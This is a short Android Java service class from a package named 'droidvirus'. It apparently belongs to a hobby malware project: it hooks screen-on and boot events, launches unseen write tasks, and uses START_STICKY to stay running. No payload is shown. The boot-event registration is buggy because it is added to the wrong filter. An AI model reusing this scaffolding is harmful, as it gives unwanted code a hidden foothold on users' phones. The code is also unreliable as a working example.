package com.artisanter.droidvirus;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class MainService extends Service {
    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");

    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId){

        IntentFilter screenStateFilter = new IntentFilter();
        screenStateFilter.addAction(Intent.ACTION_SCREEN_ON);
        registerReceiver(new ScreenOnReceiver(), screenStateFilter);

        IntentFilter bootFilter = new IntentFilter();
        screenStateFilter.addAction(Intent.ACTION_BOOT_COMPLETED);
        registerReceiver(new BootReceiver(), bootFilter);

        ScheduledWriter.set(this);
        new WriteTask().execute(this);
        return Service.START_STICKY;
    }

}
